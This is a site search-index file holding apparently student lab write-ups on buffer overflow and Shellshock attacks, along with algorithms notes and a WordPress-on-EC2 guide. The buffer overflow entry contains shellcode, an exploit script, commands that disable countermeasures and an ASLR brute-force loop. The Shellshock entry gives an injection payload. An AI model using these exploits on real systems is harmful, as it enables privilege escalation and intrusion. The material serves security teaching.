'use strict';(function(){const b={cache:!0};b.doc={id:'id',field:['title','content'],store:['title','href','section']};const a=FlexSearch.create('balance',b);window.bookSearchIndex=a,a.add({id:0,href:'/docs/Classes/Computer-System-Security/Labmodule4/',title:"Buffer Overflow Vulnerability",section:"Computer System Security",content:"Module 4 Lab: Buffer Overflow #  1 Overview #  Learning Objective:\nStudents will gain first hand experience of the buffer overflow vulnerability. Buffer overflow is when a program attempts to write data beyond the boundary of the space allocated for it in a fixed length buffer. The overwritten code, can be formatted in a way that the return address of the function points to malicious code.\nThis lab covers the following topics:\n Buffer overflow vulnerability and attack stack layout in a function address randomization, non executable stack and StackGuard  2 Lab tasks #  2.1 Turning Off Countermeasures #  Address Space Randomization\nSeveral linux based distros use address space randomization to randomize the starting address of th e stack and the heap. which makes guessing the address difficult, and guessing the address is one of the critical parts of the buffer overflow vulnerability. Use the following code to disable:\nsudo sysctl -w kernel.randomize_va_space=0\nStackGuard protection\nA guard to prevent buffer overflow implemented with GCC. turn off with the following command during compilation:\ngcc -fno-stack-protector example.c\nNon-Executable stack\nIn Ubuntu they now longer allow executable stacks. To make the stacks executable use the following when compiling programs:\nFor executable stack: $ gcc -z execstack -o test test.c For non-executable stack: $ gcc -z noexecstack -o test test.c Configuring /bin/sh\nIn moderne versions of Ubuntu the /bin/sh program points at the newer dash program which has contermeasures that prevents itself from being executed in a set-UID program, because our victim program relies on being a set-UID program we need to change the shell program with the following command:\nsudo ln -sf /bin/zsh /bin/sh\n2.2	Task 1: Running Shellcode #  Shellcode is the code used to launch a shell program similar to using execve() to run /bin/sh within a c program. The program below from the SEED lab is used to launch /bin/sh\n/* call_shellcode.c */ /*A program that creates a file containing code for launching shell*/ #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;stdio.h\u0026gt; const char code[] = \u0026#34;\\x31\\xc0\u0026#34; /* xorl %eax,%eax */ \u0026#34;\\x50\u0026#34; /* pushl %eax */ \u0026#34;\\x68\u0026#34;\u0026#34;//sh\u0026#34; /* pushl $0x68732f2f */ \u0026#34;\\x68\u0026#34;\u0026#34;/bin\u0026#34; /* pushl $0x6e69622f */ \u0026#34;\\x89\\xe3\u0026#34; /* movl %esp,%ebx */ \u0026#34;\\x50\u0026#34; /* pushl %eax */ \u0026#34;\\x53\u0026#34; /* pushl %ebx */ \u0026#34;\\x89\\xe1\u0026#34; /* movl %esp,%ecx */ \u0026#34;\\x99\u0026#34; /* cdq */ \u0026#34;\\xb0\\x0b\u0026#34; /* movb $0x0b,%al */ \u0026#34;\\xcd\\x80\u0026#34; /* int $0x80 */ ; int main(int argc, char **argv) { char buf[sizeof(code)]; strcpy(buf, code); ((void(*)( ))buf)( ); } Compiling this code with gcc -z execstack -o call_shellcode call_shellcode.c gives the following, you can see using the ps command that we have one bash process and on sh process\n 2.3	The Vulnerable Program #  The program stack.c from SEED labs is vulnerable to a buffer overflow attack because of the call to the strcpy() function. We need to exploit this vulnerability and gain root privilege. When Compiling stack.c make sure to turn off the StackGuard and the non executable stack protections. Also make sure to make the stack program a set-UID program like shown below.\n If we try to run stack right now then we just get a segmentation fault. We need to create a bad file with the exploit.c program to get root access.\n2.4	Task 2: Exploiting the Vulnerability #  To exploit the vulnerability within the stack program we need to overflow the buffer and over write the return address of the foo functions stack frame, to point to or own malicious shellcode. In order to not have to just guess where the return address is I am going to re compile with gdb turned on in order to step through the program.\nBy creating a breakpoint in the program, at the function where the strcpy() function is we can use gdb to print out the return address. We know that in x86 architecture that the frame pointer is stored in the ebp register and we can print out that register in gdb by doing the following command:\n We can see the address of the buffer with gdb as well like so:\n  Here is the contents of my exploit.py\n#!/usr/bin/python3 import sys shellcode= ( \u0026#34;\\x31\\xc0\u0026#34; # xorl %eax,%eax \u0026#34;\\x50\u0026#34; # pushl %eax \u0026#34;\\x68\u0026#34;\u0026#34;//sh\u0026#34; # pushl $0x68732f2f \u0026#34;\\x68\u0026#34;\u0026#34;/bin\u0026#34; # pushl $0x6e69622f \u0026#34;\\x89\\xe3\u0026#34; # movl %esp,%ebx \u0026#34;\\x50\u0026#34; # pushl %eax \u0026#34;\\x53\u0026#34; # pushl %ebx \u0026#34;\\x89\\xe1\u0026#34; # movl %esp,%ecx \u0026#34;\\x99\u0026#34; # cdq \u0026#34;\\xb0\\x0b\u0026#34; # movb $0x0b,%al \u0026#34;\\xcd\\x80\u0026#34; # int $0x80 ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) # Put the shellcode at the end start = 517 - len(shellcode) content[start:] = shellcode ################################################################## ret = 0xbfffeb18 + 120 # replace 0xAABBCCDD with the correct value offset = 36 # replace 0 with the correct value content[offset:offset + 4] = (ret).to_bytes(4,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) Notice that return address has been pushed forward 120 bytes, this is because when stack is run with gdb the stack frame may not be exactly the same as when gdb is turned off. This doesn\u0026rsquo;t change very much because most of the bad file is just filled with 0x90 or the NOP command. Notice the offset it the 36 bytes from the end of the buffer to the return address.\nWhen I run the exploit.py script then a bad file is generated, which gives me access to the root shell when stack is run. Shown below:\n 2.5	Task 3: Defeating dash\u0026rsquo;s Countermeasure #  dash drops the privileges when the effective UID does not match the real UID, but this countermeasure can be defeated by not using the /bin/sh in the shellcode, and instead use a different shellcode.\nFirst we need to change back the symbolic link between /bin/sh and dash with the following command:\nsudo ln -sf /bin/dash /bin/sh\nWithin the dash_shell_test.c program there is a line to set the user id to 0, or the root user id. When you run the program with that line commented out, you only get a normal shell. However when run again with the setuid(0); line uncommented then we get the root shell, which means our shellcode can be changed to get around the dash counter measure.\nI then went and changed the shellcode with exploit.py to the updated shellcode from the lab description. After running the exploit script again I was able to get another root shell with dash being used.\n 2.6	Task 4: Defeating Address Randomization #  In order to try and defeat the address Randomization we need to turn that counter measure back on:\nsudo /sbin/sysctl -w kernel.randomize_va_space=2\nOn 32 bit linux machines the stack only has 19 bits of entropy. Meaning there is only   \\( 2^{19} = 524,288 \\)  possibilities. This can be defeated by brute force, with the following bash script.\n#!/bin/bash SECONDS=0 value=0 while [ 1 ] do value=$(( $value + 1 )) duration=$SECONDS min=$(($duration / 60)) sec=$(($duration % 60)) echo \u0026#34;$minminutes and $secseconds elapsed.\u0026#34; echo \u0026#34;The program has been running $valuetimes so far.\u0026#34; ./stack done After Letting the script run for a little while I was able to get the root shell, it took about 24,687 times shown here:\n 2.7	Task 5: Turn on the StackGuard Protection #  Make sure to turn of the address randomization before attempting this or else you wont know what stopped your attack from working.\nNow I need to recompile stack.c with the stack protections on like this:\ngcc -o stack -z execstack stack.c\n As you can see above the attack no longer works because the StackGuard has detected that the stack has been smashed and automatically aborts the program.\n2.8	Task 6: Turn on the Non-executable Stack protection #  First we need to recompile the vulnerable stack.c program to to use the non executable stack protection with the following command:\ngcc -o stack -fno-stack-protector -z noexecstack stack.c\nWhen I try to run the vulnerable program again I get a segmentation fault, because this protection makes it so that I can not execute the code on the stack, making it impossible to run the shellcode that was injected from the badfile. However this does not prevent a buffer overflow from actually occurring.\n"}),a.add({id:1,href:'/docs/Classes/Algorithms/Hashing/',title:"Hashing",section:"Algorithms",content:"Hashing #  Date: Mar 2, 2021 Module: four\nDictionary (ADT) #   Maintain set of items ( key, Value) insert an item (key, value) delete items (key, value) search (key) to get specified value insert item ( do not allow duplicate keys to exist)    \\(O(1)\\)  time, expected time not worst case time We are leaving the comparison model, since we proved the fastest search time is  \\(O(nlog(n))\\)   Can not find nearby values, or minimum/ maximum values as easily since we are not within the comparison model.  Python Dictionaries #  Create: D = dict()\nInsert: D[key] = value\nSearch: D[key] → Gives a value\ndelete: del D[key]\nd.items → [ (k,v) , (k,v) ... ]\nMotivation: #   Document Distance Databases, Most do but not all word → definition dictionary ( An actual dictionary )  words are keys, definitions are values   Spell Checkers, nearby words Login credentials, key username, password is a hashed version of the password  Simple Approach #  Direct Access table or array\n  items in array indexed by key\nBad #   requires keys to be integer Memory hog  Solution to problem 1: pre-hash ( maps keys to non-negative integers)\nSolution to problem 2: Hashing\nOrigins of the word hash: to cut into pieces and mix around.\n map the set of all possible keys ( after pre-hashing ) to a valid index in the array Collision is when two keys map to the same index within the array   Chaining to Deal with collisions:\n   Simple Uniform Hashing #  Uniformity:\nany arbitrary key is equally likely to be mapped to any index in the table.\nIndependence:\nindependent of where the other keys are hashed.\nHashing with Chaining Analysis: #  n keys, m indexes\nwhat is the expected length of a chain ?\n \\(\\alpha = \\frac{n}{m} = Load\\ Factor\\)  if  \\(m = \\theta (n)\\)  then\nthen  \\(\\alpha\\ is \\theta(1)\\)  if  \\(\\alpha= \\theta(1)\\)  , then insert, delete, search take:\nhash:  \\(\\theta(1)\\)  This may not be true, for example with strings that may be very long, but the time is still bounded.\nindex array:  \\(\\theta(1)\\)  find element in chain:  \\(\\theta (\\alpha)\\)  if  \\(\\alpha = \\theta(1)\\)  then\nExample Hash Functions #    Division method\n \\(h(k) = k\\ mod\\ m\\)    The multiplication Method\nassume  \\(m = 2^r\\)   \\(h(k) = [(a * k)\\ mod\\ 2^w]\u0026gt;\u0026gt;(w-r)\\)  a: Random Constant\nw: Is the length of the word of the machine\n \\(a * k\\)  = 2 words = 2w bits\n \\((a*k)\\ mod\\ 2^w\\)  rightmost w bits\n( ) \u0026raquo; (w-r) → left most r bits\n  Universal Hashing\n   "}),a.add({id:2,href:'/docs/Classes/Computer-System-Security/envVariables/',title:"Env Variables",section:"Computer System Security",content:"Environment Variables (Reading) #   Link to Reading\nEnvironment:\nAn area that the shell builds every time that it starts a session, that contains variables that define system properties.\nEvery time a shell spawns a process gathers and compiles information that should be available to the shell process and any children, from files and settings on the system.\nEnvironment is implemented as key value pairs, if there are multiple values they are separated by colons :\nKEY = value1: value2\nif there is white space:\nKEY = \u0026quot;value with spaces \u0026quot;\nEnvironment Variables: variables defined for the current shell, inherited by any child shells. used to pass information into processes that are spawned from the shell.\nShell Variables: variables contained only in the shell that they were defined in, used for ephemeral data for example the working directory\nprint variables with:\nprintenv\nenv lets you modify the environment that programs run ion by passing a set of variable definitions into a command line\nset : get a list of all shell variables, environment variables, local variables, and shell functions\n Environment variables are only passed to the child processes. so if a new environment variable is made within a child process the variable is destroyed when we return to the parent process.  To make environment variables persistent even after the process, is closed so they do not need to be set every time bash is started, is more difficult than it seems due to the fact that bash starts in different ways depending on how the process is opened.\nLogin vs non-Login shells\n login: begins by authenticating the user, via terminal or ssh and authenticate  will read details from /etc/profile first, then look for the first login shell configuration file in the users home directory. reads the first file within ~/.bash_profile, ~/.bash_login, and ~/.profile doesn\u0026rsquo;t read any further files in the above   non-login: starting a shell within an authenticated session, for example calling bash within terminal. we were not asked for authentication details  will read /etc/bash.bashrc, then the user specified ~/.bashrc to build environment    interactive and non interactive:\n interactive: shell session attached to a terminal  normal session that begins with ssh   non interactive: not attached to a terminal session  script run from command line: non interactive, non log in read the environmental variable called BASH_ENV, and read the file specified to define the new environment   shell sessions can be any combo of interactive, non interactive, login and non login  Implementing Environment Variables:\n Usually we want our settings to be available both within the login and non login shells, so we define variables within the ~/.bashrc file new environment variables can be placed anywhere within the file if system wide variables are needed then you need to think about adding them to /etc/profile, /etc/bash.bashrc , /etc/environment  "}),a.add({id:3,href:'/docs/Classes/Computer-System-Security/Format-String-Vulnerability/',title:"Format String Vulnerability",section:"Computer System Security",content:"Format String Vulnerability #  Computer Security A Hands On Approach - Wenliang Du\nThis vulnerability deals with format strings, within\n"}),a.add({id:4,href:'/docs/Projects/WordPressOnAmazonEc2/',title:"Word Press on Amazon Ec2",section:"Projects",content:"AWS Wordpress EC2 image #  Launching the Instance #    For this project we use an Amazon Linux 2 AMI with the x86 architecture.\n   The free tier t2.micro machine should be sufficient for the needs of this website. If the site gains a lot of traffic then we may need to upgrade this later.\n   When creating your instance you will need to create a public and private ssh key. AWS allows you to easily download your private key. Make sure to download your public key into a safe place, as this is the only time that you will be able to download this key. The name does not matter, just make sure you know where on your computer this key is located.\n   Connecting to your EC2 Instance #  Change the permissions of your private key:\n Navigate to the directory where your private key is located and used the following command:  chmod 400 \u0026lt;nameOfYourKey\u0026gt;.pem    SSH into your ec2 instance\nSSH stands for secure shell, this is a way to access a computer over the internet that you are not directly connected to. Using the terminal cd into the directory where your private key is located and use the following command:\n Go to the ec2 management console on AWS educate and find your instances public ipv4 instance. In the terminal make sure you are in the folder where your .pem is located, the use the following command to ssh into your instance. ssh -i \u0026lt;nameOfYourKey\u0026gt;.pem ec2-user@\u0026lt;public ipv4 address of your instance\u0026gt; if prompted for ECDSA fingerprint, type yes  If you have done everything correctly you should be greeted by something that looks like the following:\n Installing the LAMP stack #  After successfully Connecting to the instance, we need to install the LAMP stack onto our ec2. Reconnect to your instance and follow the following instructions:\nNote: The following commands are taken DIRECTLY from the AWS documentation linked here.\n  Update Software packages: sudo yum update -y\n  Install the lamp-mariadb10.2-php7.2 and php7.2 Amazon Linux Extras repositories to get the latest versions of the LAMP MariaDB and PHP packages for Amazon Linux 2:\nsudo amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2\n  Install Apache web server, MariaDB, and PHP packages:\nsudo yum install -y httpd mariadb-server\n  Start the Apache Web server:\nsudo systemctl start httpd\n  Configure the Apache Web server to Start when booted up:\nsudo systemctl enable httpd\n5.1. Verify httpd is on:\nsudo systemctl is-enabled httpd\nShould receive the following response: enabled\n  Allow inbound traffic by changing the inbound rules on your security group. Official AWS documentation on changing security group rules here.\n  Under Network \u0026amp; Security on the left navigation bar. Click Security groups.\n   Identify which security group to edit. For me it was Launch-wizard-1 that was already attached to my ec2 instance.\n   using the CIDR block 0.0.0.0/0 allows all traffic to reach your web server, use this only for testing for a short while. Production environments should not use this rule.\n    Test the Web-server by visiting the public DNS address. Find this on your instances management console.\nBecause there is nothing in the /var/www/html folder we should get the apache test page\n   Setting File Permissions #  Apache serves files that are located in the Apache document root or /var/www/html which is owned be root by default. We need to give the ec2-user account permissions in order to manipulate files with the Apache Document root. Use the Following steps. Again these steps are take directly from the AWS documentation linked here.\n  Add Your user to the Apache Group:\nsudo usermod -a -G apache ec2-user\n  Logout and login again to make sure the ec2-user is part of the apache group.\n  Logout with:\nexit\n  Reconnect to the instance via ssh, like before. Once connected check your groups with the following:\ngroups\nYou should see apache as one of the groups.\n     Change the group ownership of /var/www and thus its contents to the Apache group:\nsudo chown -R ec2-user:apache /var/www\n  Add group write permissions and set the group ID on future subdirectories by changing the directory permissions of /var/www and its subdirectories:\nsudo chmod 2775 /var/www \u0026amp;\u0026amp; find /var/www -type d -exec sudo chmod 2775 {} \\;\n  add group write permissions by recursively changing the file permissions:\nfind /var/www -type f -exec sudo chmod 0664 {} \\;\n  Testing the LAMP server #    Create a PHP file in the Apache Document root:\necho \u0026quot;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026quot; \u0026gt; /var/www/html/phpinfo.php\n  View the PHP file we just created in the browser:\n \nMake sure to use your instances public dns when viewing this page, you should get the following:\n   Because this page gives information about specific software being used on your stack, we should not have it viewable over the internet for security reasons. Delete the PHP file:\nrm /var/www/html/phpinfo.php\n  Secure the Database Server #  MariaDB installs with features that are useful while developing however, they should not be used while in production. The following steps are how to secure the database; again these steps are taken directly from the AWS documentation linked before.\n  Start MariaDB server:\nsudo systemctl start mariadb\n  run msql_secure_installation\nsudo mysql_secure_installation\nYou will be prompted to enter a root password. The by default there is no root password so press enter.\nThen you will be prompted to create a root password. Enter the Password, then press y for all of the options following.\n  To turn off the database (optional):\n  sudo systemctl stop mariadb\nTo start the database on boot-up (optional):  sudo systemctl enable mariadb\nSaving Your Instance as an Image #  On the AWS ec2 management console select the instance that you have intalled the LAMP stack on.\n press Actions    Press Image and templates: Press Create image    You can find the Image that you created in the left nav bar under Images \u0026gt; AMIs   Once the image has been created you can use that image to launch an instance with the LAMP stack already enabled from the AMIs page. Launch a second image and use that as a starting point to install wordpress.\nInstalling WordPress #  Connect to your new instance that already has the LAMP stack created and running on it. and follow the following instructions to install wordpress on your instance. These Instructions are taken directly from the AWS documentation found here.\n  Download the latest WordPress release with wget\nwget [https://wordpress.org/latest.tar.gz](https://wordpress.org/latest.tar.gz)\n  Unzip the installation package:\ntar -xzf latest.tar.gz\n  Create Database user and databse for Wordpress #    Start databse server:\nsudo systemctl start mariadb\n  Log in to databse server as root user, you should have made this passsword in an earlier step when configuring the lamp stack.\nmysql -u root -p\n  This will bring up the database interaction that looks like the following:\nMariaDB [(none)]\u0026gt;\n  Create a username and password with the following command:\nCREATE USER 'wordpress-user'@'localhost' IDENTIFIED BY 'your_strong_password';\n Replace wordpress-user with a username Replace your_strong_password with a password, avoid the ' character or else you will break the command      Create the database, use a descriptive name like wordpress-db\nCREATE DATABASE wordpress-db;\n  Grant full privileges to the user created at step 2:\nGRANT ALL PRIVILEGES ON wordpress-db.* TO \u0026quot;wordpress-user\u0026quot;@\u0026quot;localhost\u0026quot;;\n make sure to change wordpress-user to the username you set earlier    Pick up all the changes you made by flushing the database:\nFLUSH PRIVILEGES;\n  Exit the mysql client:\nexit\n  Create and Edit the wp-config.php file #    Copy the sample config file to a file called wp-config.php\ncp wordpress/wp-config-sample.php wordpress/wp-config.php\n  Use Nano to edit the wp-config.php file. DO NOT USE VIM, unless you have used it before and know how to navigate using vim. find and edit the following lines, when editing make sure to use the values you set earlier.\nnano wordpress/wp-config.php\n Edit the line that defines the database name: define('DB_NAME', 'wordpress-db'); Edit the line that defines the databse user: define('DB_USER', 'wordpress-user'); Edit the line that defines the password: define('DB_PASSWORD', 'your_strong_password'); Go to this link and generate unique keys and salt.  define('AUTH_KEY', ' #U$$+[RXN8:b^-L 0(WU_+ c+WFkI~c]o]-bHw+)/Aj[wTwSiZ\u0026lt;Qb[mghEXcRh-'); define('SECURE_AUTH_KEY', 'Zsz._P=l/|y.Lq)XjlkwS1y5NJ76E6EJ.AV0pCKZZB,*~*r ?6OP$eJT@;+(ndLg'); define('LOGGED_IN_KEY', 'ju}qwre3V*+8f_zOWf?{LlGsQ]Ye@2Jh^,8x\u0026gt;)Y |;(^[Iw]Pi+LG#A4R?7N`YB3'); define('NONCE_KEY', 'P(g62HeZxEes|LnI^i=H,[XwK9I\u0026amp;[2s|:?0N}VJM%?;v2v]v+;+^9eXUahg@::Cj'); define('AUTH_SALT', 'C$DpB4Hj[JK:?{ql`sRVa:{:7yShy(9A@5wg+`JJVb1fk%_-Bx*M4(qc[Qg%JT!h'); define('SECURE_AUTH_SALT', 'd!uRu#}+q#{f$Z?Z9uFPG.${+S{n~1M\u0026amp;%@~gL\u0026gt;U\u0026gt;NV\u0026lt;zpD-@2-Es7Q1O-bp28EKv'); define('LOGGED_IN_SALT', ';j{00P*owZf)kVD+FVLn-~ \u0026gt;.|Y%Ug4#I^*LVd9QeZ^\u0026amp;XmK|e(76miC+\u0026amp;W\u0026amp;+^0P/'); define('NONCE_SALT', '-97r*V/cgxLmp?Zy4zUU4r99QQ_rGs2LTd%P;|_e1tS)8_B/,.6[=UK\u0026lt;J_y9?JWG'); Exit the file and save by pressing: ctrl+x, y, then enter\n  Install your WordPress files under the Apache Document Root #  To have WordPress run at the document root do the following;\ncp -r wordpress/* /var/www/html\nAllow WordPress to Use Permalinks #    open https.conf file with nano:\nsudo nano /etc/httpd/conf/httpd.conf\n  find the section that starts with: \u0026lt;Directory \u0026quot;/var/www/html\u0026quot;\u0026gt;\n  inside this section there should be a line that says: AllowOverride None\nchange the all to All\n  Exit nano the same way as above.\n  Install the PHP graphics drawing library on Amazon Linux 2 #    Install php-gd\nsudo yum install php-gd\n  Verify the install version, the following command sudo yum list installed | grep php-gd should give the following ouput php72-gd.x86_64 7.2.30-1.22.amzn1 amzn-updates\n  Fix File Permissions for the Apache Web Server #  Because WordPress needs to write to the Apache Document Root we need to change some permissions.\n  Grant file ownership of /var/www to the apache user\nsudo chown -R apache /var/www\n  Grant ownership of /var/www to the apache group\nsudo chgrp -R apache /var/www\n  Change directory permissions of /var/www to add group write permissions and to set the group ID on future subdirectories:\nsudo chmod 2775 /var/www find /var/www -type d -exec sudo chmod 2775 {} \\;\n  Change the file permissions of /var/www to add group write permissions:\nfind /var/www -type f -exec sudo chmod 0664 {} \\;\n  Restart the Apache Web server:\nsudo systemctl restart httpd\n  Running the WordPress Installation Script #  We are now ready to install wordpress.\n  use systemctl to ensure https and databse services start at boot up\nsudo systemctl enable httpd \u0026amp;\u0026amp; sudo systemctl enable mariadb\n  Verify database is running:\nsudo systemctl status mariadb if not running use sudo systemctl start mariadb to start it.\n  verify Apache web server is running:\nsudo systemctl status httpd if not running use sudo systemctl start httpd to start it.\n  visit your public dns, you should see your word press website. Once youve gotten to this point, it would be wise to stop your instance and create an image from this instance.\n  "}),a.add({id:5,href:'/docs/Classes/Algorithms/balancedBST/',title:"Balanced Trees and AVL Trees",section:"Algorithms",content:"Balanced BST\u0026rsquo;s #   Importance of balancing AVL trees  Remember binary search trees where all items in nodes subtree are less than the root and all of the items in the right subtree are greater than the root.\nBalancing Trees #  What is a balanced tree? #  Ideally we want our tree to have a height of   \\(\\theta(log(n))\\)  Thus a BST is balanced if and only if:\n The hieghts of left/ right subtrees differ by no more than 1 The left and right sub trees are balanced  Find and label the heights of the tree  How can we recursively find node heights? Recurse on both children, then when you return add one to the larger of the subtrees maximum height.   AVL Trees #  AVL trees are a binary search tree that follows the AVL Constraint\nAVL Constraint #  Heights of the left and right children differ by at most one for all nodes\nWe want to prove that the height of an AVL tree are  \\(\\theta(log(n))\\)  . Lets take a look at the worst case scenario for an AVL tree, where every right subtree is one taller than the corresponding left sub tree.\n  \\(N_h =\\ minimum\\ number\\ of\\ nodes\\ possible\\ in\\ AVL\\ tree\\ with\\ height\\ h\\)   \\(N_h = N_{h-1}\u0026#43;N_{h-2}\u0026#43;1\\)  Clearly this sequence is increasing and  \\(N_h \u0026gt; 2N_{h-2}\\)  , meaning that our sequence or number of nodes within the tree at least doubles, thus\n \\(N_h \u0026gt; 2^{\\frac{h}{2}}\\)  and  \\(h \u0026lt; 2log(n)\\)  Maintaining the AVL Constraint #  AVL Insert: #   BST Insert Fix AVL Constraint  The Real question here is how do we maintain the AVL constraint, so that by fixing the AVL tree so we don\u0026rsquo;t spend more than the desired  \\(\\theta(log(N))\\)  time.\nRotation #   Look at the following BST, when we insert 23, we get a doubly left heavy subtree and need to do a right rotate in order to fix our tree to follow the AVL constraint.\n Sometimes just doing one single rotation is not enough, for example look wha theppens when we try to insert 55 and right rotate below.\n Because 50\u0026rsquo;s left subtree was empty, when we did the right rotate we created a doubly right heavy sub tree, to fix this we should have actually done a double rotation. Shown below.\n Above we fixed the empty left sub tree, by doing a left rotate on 55. Then fixed the doubly left heavy sub tree of 65 by right rotating.\nQuestions #    A single insertion of deletion creates a violation of the AVL constraint. What is the difference between the offending sub trees? Why?\n2, because the elements are at most already one away from each other so when we insert a new node we are at most adding one to that\n  By Fixing this, we make another violation. What is the difference between the offending sub trees height? why?\n2, the rotated sub trees height either remains the same or decreases by one so the same reasoning from above applies.\n  Fixing the AVL Property #  Suppose x is the lowest node violating the AVL property. (Start at inserted node, go up until you find x, fix x as below then keep goin up from x) if x is right heavy if right(x) if right heavy or balanced then left rotate(x) else right rotate(right(x)) left rotate(x) else if left(x) is left heavy or balanced the right rotate(x) else left rotate(left(x)) right rotate(x) Time Complexity of AVL #  Time to insert:  \\(\\theta(log(n))\\)  number of corrections:  \\(\\theta(h) = \\theta(log(n))\\)  corrections:  \\(\\theta(1)\\)  time each\n"}),a.add({id:6,href:'/docs/Classes/Computer-System-Security/Lab-Module-3-Shellshock-Attack/',title:"Shell Shock Attack",section:"Computer System Security",content:"Lab Module 3: Shellshock Attack #  Alexander Sullivan\n3/04/21\nPart One: Overview #  Learning Objective: get first hand experience with the shellshock vulnerability.\nWe will be experimenting with the actual shellshock attack in this lab. The Shellshock attack was first developed on September 24, 2014, and was a vulnerability within the Bash program.\nPart Two: Lab Tasks #  2.1 Experimenting with Bash function #  Bash within Ubuntu 16.04 has already been patched to fix the vulnerability, so the creators of the SEED VM have included a vulnerable version of the Bash program inside the /bin folder, known as bash_shellshock\nWe will design an experiment that will verify that the bash_shellshock program is indeed vulnerable to the shell shock attack and then try the attack on the regular Bash program.\n Above we can see the exploit that makes bash vulnerable to a shellshock attack, because of a function called parse_and_execute() within the bash code when a new shell is created the line echo \u0026quot;malicious code\u0026quot; was executed rather than copied as part of the environment variable. This is because environment variables need to be passed from parent to child process.\nBelow you can see that I changed my shell to one vulnerable to the shellshock attack, and then used a similar exploit as explained during class to get the root shell. I\u0026rsquo;m not completely sure how this works, but I believe it has something to do with the fact that when you export your foo environment variable, then run our program a.out uses the system() function to create a child process. When that child process is created it incorrectly parses the foo environment variable and executes the shell program. Then because a.out is a setuid program with root privileges the resulting shell is opened as root.\n  2.2 Setting up CGI programs #  In this task we set up a cgi program and then viewed the resulting page at localhost/gi/bin/myprog.cgi\n​	 Then above you can see the page with the curl command.\n2.3 Passing Data to Bash via Environment variable #  In this task we changed the CGI program to display the environment variables using strings /proc/$$/environ\nSeen using the curl command here: This data could potentially be present from a remote server serving the web page. Here the info is from local host because we are running the web-server on our own machine.\n2.4 Launching the Shellshock Attacks #  So this gave me access to the root shell but I\u0026rsquo;m not sure if this attack was done correctly. First of all I changed the a.out program to the following\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; void main(){ setuid(geteuid()); system(\u0026#34;curl http://localhost/cgi-bin/myprog.cgi\u0026#34;); } Then I changed the resulting binary of the program above to be a setuid program, and exported another foo environment variable like this:\nexport foo='() { echo \u0026quot;hello\u0026quot;; }; /bin/sh'\nThe following is the result:\n 2.5 Getting a Reverse Shell via Shellshock Attack #  In this task we were supposed to be able to get a reverse shell from the web server to our own shell. I figured this out after watching the lecture from Wenliang Du on you tube. He goes over how to listen on a port using the nc command and how to redirect the std out and std in back to another shell process.\nCombining this with the shellshock attack and I was able to open a reverse shell within the web server. Some environment variables are passed from the client process to the server process, so you can user the shellshock attack in a similar way as earlier. I did this using two terminals on the same machine like so:\nOn one terminal I used nc to listen to port 9090:\n Then in another terminal I used a curl command and a shellshock attack to inject the reverse shell.\n Back on the first terminal where I was listening I received the following:\n 2.6 Using the Patched Bash #  Running the same vulnerabilities as before I could no longer get the attacks to work. The shellshock injection has been patched so that the following commands are no longer executed.\n"})})()